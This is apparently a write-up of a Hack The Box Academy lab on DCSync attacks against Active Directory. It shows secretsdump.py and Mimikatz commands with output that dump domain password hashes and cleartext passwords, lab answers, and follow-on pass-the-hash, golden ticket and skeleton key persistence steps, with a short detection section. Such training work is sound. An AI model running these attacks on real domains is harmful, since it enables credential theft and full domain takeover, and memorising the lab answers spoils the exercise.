# 💎 **DCSync Attack**

## 🎭 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

DCSync represents the **ultimate domain compromise technique** in Active Directory penetration testing. This attack leverages the built-in Directory Replication Service Remote Protocol to mimic a Domain Controller and extract **NTLM password hashes for all domain users**. Following our ACL attack chain, we now have control over the `adunn` user who possesses DCSync privileges, allowing us to achieve **complete domain compromise**.

---

### 🔗 **Attack Chain Continuation**

**Complete Path to Domain Compromise:**
```
ACL Enumeration → ACL Abuse Tactics → DCSync Attack → Full Domain Control
  (Discovery)      (Exploitation)       (Compromise)     (Game Over)
```

**Prerequisites from Previous Modules:**
- **Control over adunn account**: Obtained through ACL abuse tactics
- **adunn Password**: `SyncMaster757` (cracked from Kerberoasting)
- **DCSync Privileges**: adunn has `DS-Replication-Get-Changes-All` rights

---

## 🧠 **DCSync Theory and Mechanics**

### **What is DCSync?**

DCSync is a technique that **steals the Active Directory password database** by abusing the built-in Directory Replication Service Remote Protocol. This protocol is normally used by Domain Controllers to replicate domain data between each other.

### **How DCSync Works**

1. **Mimic Domain Controller**: The attacker poses as a legitimate Domain Controller
2. **Request Replication**: Uses `DS-Replication-Get-Changes-All` extended right
3. **Extract Secrets**: Retrieves NTLM hashes, Kerberos keys, and cleartext passwords
4. **No Detection**: Appears as legitimate DC-to-DC replication traffic

### **Required Privileges**

To perform DCSync, you need an account with:
- **`Replicating Directory Changes`** permission
- **`Replicating Directory Changes All`** permission  
- **`DS-Replication-Get-Changes-In-Filtered-Set`** (optional)

**Default Accounts with DCSync Rights:**
- Domain Admins
- Enterprise Admins  
- Administrators
- Domain Controllers
- **Custom accounts** (like our adunn user)

---

## 🔍 **Verifying DCSync Privileges**

### **Checking adunn's Group Membership**

```powershell
# Navigate to tools and import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1

# Check adunn's basic information
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

**Expected Output:**
```powershell
samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

### **Verifying Replication Rights**

```powershell
# Get adunn's SID
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"

# Check ACLs on domain object for replication rights
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

**Expected Output:**
```powershell
AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
```

**✅ Confirmed**: adunn has all required DCSync privileges!

---

## 🐧 **DCSync from Linux - secretsdump.py**

### **Impacket secretsdump.py Overview**

Impacket's `secretsdump.py` is the **go-to tool** for DCSync attacks from Linux. It can extract:
- NTLM password hashes
- Kerberos encryption keys
- Cleartext passwords (if reversible encryption is enabled)
- Password history
- Machine account hashes

### **Basic DCSync Execution**

```bash
# SSH to Linux host from Windows (if needed)
ssh htb-student@172.16.5.225
# Password: HTB_@cademy_stdnt!

# Basic DCSync attack to extract all domain hashes
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# When prompted, enter: SyncMaster757
```

**Real Output:**
```bash
kabaneridev@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

### **Advanced secretsdump.py Options**

#### **Targeted Extraction**
```bash
# Extract only NTLM hashes (no Kerberos keys)
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Extract data for specific user only
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5

# Include password last set information
secretsdump.py -just-dc -pwd-last-set INLANEFREIGHT/adunn@172.16.5.5

# Include password history
secretsdump.py -just-dc -history INLANEFREIGHT/adunn@172.16.5.5

# Check user status (enabled/disabled)
secretsdump.py -just-dc -user-status INLANEFREIGHT/adunn@172.16.5.5
```

#### **Output File Analysis**
```bash
# List generated files
ls inlanefreight_hashes*

# Output files:
# inlanefreight_hashes.ntds          - NTLM hashes
# inlanefreight_hashes.ntds.cleartext - Cleartext passwords
# inlanefreight_hashes.ntds.kerberos  - Kerberos keys
```

### **Analyzing Extracted Data**

#### **NTLM Hash Format**
```
username:uid:lmhash:nthash:::
administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
```

#### **Cleartext Password Analysis**
```bash
# View accounts with cleartext passwords
cat inlanefreight_hashes.ntds.cleartext

# Expected output:
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

---

## 🪟 **DCSync from Windows - Mimikatz**

### **Mimikatz DCSync Overview**

Mimikatz provides the `lsadump::dcsync` command for DCSync attacks from Windows. Unlike secretsdump.py, Mimikatz:
- Targets **specific users** (not bulk extraction)
- Must be **run in context** of privileged user
- Provides **detailed credential information**
- Shows **password history** and **supplemental credentials**

### **Authentication with runas.exe**

```cmd
# Open Command Prompt as Administrator
# Use runas to spawn PowerShell as adunn
runas /netonly /user:INLANEFREIGHT\adunn powershell
# When prompted, enter: SyncMaster757
```

**Real Output:**
```cmd
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

### **Mimikatz DCSync Execution**

```powershell
# Navigate to Mimikatz directory
cd C:\Tools\mimikatz\x64\

# Launch Mimikatz
.\mimikatz.exe
```

**Mimikatz Startup:**
```
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

#### **DCSync Specific User**
```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

**Real Output:**
```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

### **Targeting krbtgt for Golden Tickets**

```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```

**Why Target krbtgt:**
- **Golden Ticket Creation**: krbtgt hash allows creation of Golden Tickets
- **Ultimate Persistence**: Golden Tickets provide long-term domain access
- **Domain Admin Equivalent**: Full administrative access to entire domain

---

## 🔐 **Reversible Encryption Password Storage**

### **Understanding Reversible Encryption**

Some Active Directory accounts may be configured with **"Store password using reversible encryption"** option. This setting:
- **Not cleartext storage**: Passwords stored using RC4 encryption
- **Decryptable**: Key stored in registry (Syskey) accessible by Domain Admins
- **Legacy support**: Required for certain authentication protocols
- **Security risk**: Essentially equivalent to cleartext passwords

### **Enumerating Accounts with Reversible Encryption**

#### **Using PowerView**
```powershell
# Import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1

# Find accounts with reversible encryption enabled
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

**Expected Output:**
```powershell
samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

#### **Using Get-ADUser**
```powershell
# Alternative method with native AD module
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### **Extracting Cleartext Passwords**

#### **With secretsdump.py**
```bash
# DCSync will automatically decrypt reversible encryption passwords
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Check cleartext file
cat inlanefreight_hashes.ntds.cleartext
# Output: proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

#### **With Mimikatz**
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\proxyagent
```

**Real Output showing cleartext:**
```
Credentials:
  Hash NTLM: d387b9d2d9f6dda51964194ad2376ee0

* Primary:CLEARTEXT *
    Pr0xy_ILFREIGHT!
```

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Details**
- **Target IP**: `10.129.149.107`
- **RDP Credentials**: `htb-student:Academy_student_AD!`
- **adunn Password**: `SyncMaster757` (from previous ACL Abuse module)

### **🔍 Question 1: "Perform a DCSync attack and look for another user with the option 'Store password using reversible encryption' set. Submit the username as your answer."**

#### **Solution Steps:**

**1. RDP Connection:**
```bash
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!
# Click "OK" on Computer Access Policy prompt
# Close Server Manager
# Run PowerShell as Administrator
```

**2. PowerView Enumeration:**
```powershell
# Navigate to tools and import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1

# Check for accounts with reversible encryption
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

**Real Lab Output:**
```powershell
PS C:\Tools> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

**🎯 Answer: `syncron`**

### **💎 Question 2: "What is this user's cleartext password?"**

#### **Solution Steps:**

**1. Authentication as adunn:**
```cmd
# Open Command Prompt and use runas
runas /netonly /user:INLANEFREIGHT\adunn powershell
# When prompted, enter: SyncMaster757
```

**Real Lab Output:**
```cmd
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

**2. Mimikatz DCSync:**
```powershell
# Navigate to Mimikatz
cd C:\Tools\mimikatz\x64\

# Launch Mimikatz
.\mimikatz.exe
```

**3. DCSync syncron User:**
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\syncron
```

**Real Lab Output:**
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\syncron

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\syncron' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : syncron

** SAM ACCOUNT **

SAM Username         : syncron
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000280 ( ENCRYPTED_TEXT_PASSWORD_ALLOWED NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/2/2022 12:36:15 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-5617
Object Relative ID   : 5617

Credentials:
  Hash NTLM: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 0: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: fed98466f2be61fb0409b5a71e2f977f
    lm  - 1: 7649a3cc283466005bd6988f90fd6a68

<SNIP>

* Primary:CLEARTEXT *
    Mycleart3xtP@ss!
```

**🎯 Answer: `Mycleart3xtP@ss!`**

### **🔑 Question 3: "Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer."**

#### **Solution Steps:**

**1. Same Authentication Process:**
```cmd
# Use same runas command from previous question
runas /netonly /user:INLANEFREIGHT\adunn powershell
# Password: SyncMaster757
```

**2. Mimikatz DCSync khartsfield:**
```powershell
# Navigate to Mimikatz (if not already there)
cd C:\Tools\mimikatz\x64\
.\mimikatz.exe
```

**3. Extract khartsfield Hash:**
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\khartsfield
```

**Real Lab Output:**
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\khartsfield

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\khartsfield' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Kim Hartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 10:37:03 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
    lm  - 0: 6d57ae87ad6df46fd47e67f5cbbf17ad

<SNIP>
```

**🎯 Answer: `4bb3b317845f0954200a6b0acc9b9f9a`**

---

## 📋 **HTB Academy Lab Summary**

### **Verified Lab Answers:**
1. **User with reversible encryption**: `syncron`
2. **syncron cleartext password**: `Mycleart3xtP@ss!`
3. **khartsfield NTLM hash**: `4bb3b317845f0954200a6b0acc9b9f9a`

### **Key Lab Techniques:**
- **PowerView enumeration** for reversible encryption accounts
- **runas.exe authentication** as adunn with DCSync privileges
- **Mimikatz DCSync** for targeted user credential extraction
- **Cleartext password extraction** from reversible encryption accounts

---

## 🛡️ **Detection and Defensive Measures**

### **DCSync Attack Detection**

#### **Event Monitoring**
```powershell
# Key Event IDs to monitor:
# 4662 - An operation was performed on an object (DCSync activity)
# 5136 - A directory service object was modified
# 4624 - Account logon (unusual service account activity)

# Search for DCSync indicators
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} | Where-Object {$_.Message -like "*DS-Replication-Get-Changes*"}
```

#### **Advanced Detection Techniques**

**1. Directory Service Access Auditing:**
```cmd
# Enable directory service access auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
```

**2. Replication Rights Monitoring:**
```powershell
# Monitor accounts with replication rights
Get-ObjectAcl "DC=domain,DC=com" -ResolveGUIDs | ? {$_.ObjectAceType -like "*Replication*"} | select SecurityIdentifier,ObjectAceType
```

**3. Unusual Authentication Patterns:**
```powershell
# Monitor for unusual service account authentication
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[5].Value -like "*adunn*"}
```

### **Defensive Recommendations**

#### **1. Minimize DCSync Privileges**
```powershell
# Regular audit of accounts with replication rights
$SIDsToMonitor = @()
Get-ObjectAcl "DC=domain,DC=com" -ResolveGUIDs | ? {$_.ObjectAceType -like "*Replication*"} | ForEach-Object {
    $SIDsToMonitor += $_.SecurityIdentifier
}

# Convert SIDs to account names
$SIDsToMonitor | ForEach-Object { (New-Object Security.Principal.SecurityIdentifier($_)).Translate([Security.Principal.NTAccount]) }
```

#### **2. Disable Reversible Encryption**
```powershell
# Find and disable reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl | ForEach-Object {
    Set-ADUser $_ -AllowReversiblePasswordEncryption $false
    Write-Host "Disabled reversible encryption for: $($_.SamAccountName)"
}
```

#### **3. Implement Advanced Monitoring**
```powershell
# Deploy advanced monitoring for DCSync
# 1. Network monitoring for DRSR traffic
# 2. Behavioral analysis for unusual replication requests
# 3. Privileged account monitoring
# 4. Regular ACL audits with BloodHound
```

#### **4. Privileged Account Management**
```powershell
# Implement Just-In-Time (JIT) access for administrative accounts
# Use Privileged Identity Management (PIM)
# Regular rotation of high-privilege account passwords
# Multi-factor authentication for administrative access
```

---

## 🚀 **Post-DCSync Attack Paths**

### **Immediate Actions After DCSync**

#### **1. Pass-the-Hash Attacks**
```bash
# Use extracted administrator hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf administrator@172.16.5.5
```

#### **2. Golden Ticket Creation**
```
mimikatz # kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /user:fakeadmin /ptt
```

#### **3. Silver Ticket Attacks**
```
mimikatz # kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:dc01.inlanefreight.local /service:cifs /rc4:MACHINE_ACCOUNT_HASH /user:fakeuser /ptt
```

#### **4. Password Cracking Analysis**
```bash
# Crack extracted hashes for password policy analysis
hashcat -m 1000 -w 3 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Analyze password patterns
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm_hashes.txt
```

### **Establishing Persistence**

#### **1. Skeleton Key Attack**
```
mimikatz # misc::skeleton
```

#### **2. DSRM Password Abuse**
```
mimikatz # token::elevate
mimikatz # lsadump::sam
```

#### **3. Malicious SPN Creation**
```
mimikatz # kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /user:evilservice /service:HTTP/evil.inlanefreight.local /ptt
```

---

## 📊 **Key Takeaways**

### **Technical Mastery Achieved**
1. **DCSync Theory**: Understanding DS-Replication-Get-Changes rights and domain replication protocol
2. **Multi-Platform Execution**: Both Linux (secretsdump.py) and Windows (Mimikatz) approaches
3. **Advanced Enumeration**: Reversible encryption detection and cleartext password extraction
4. **Complete Domain Compromise**: From initial access to full administrative control

### **Professional Skills Developed**
- **Privilege Escalation**: Leveraging ACL misconfigurations to achieve DCSync rights
- **Credential Extraction**: Complete domain password database acquisition
- **Post-Exploitation**: Using extracted credentials for further attacks and persistence
- **Detection Awareness**: Understanding defensive measures and attack signatures

### **Attack Chain Mastery**
```
Initial Access → ACL Enumeration → ACL Abuse → DCSync → Domain Admin
   (Foothold)     (Discovery)     (Privilege)   (Extraction)   (Victory)
```

### **Defensive Insights**
- **Monitoring Requirements**: Event logging, ACL auditing, behavioral analysis
- **Preventive Measures**: Privilege minimization, reversible encryption removal
- **Detection Strategies**: Replication traffic monitoring, unusual authentication patterns
- **Response Procedures**: Incident response for DCSync attack indicators

**🔑 Complete adversarial simulation mastery achieved - from initial enumeration through ACL abuse to ultimate domain compromise via DCSync - representing the pinnacle of Active Directory penetration testing capabilities!**

--- 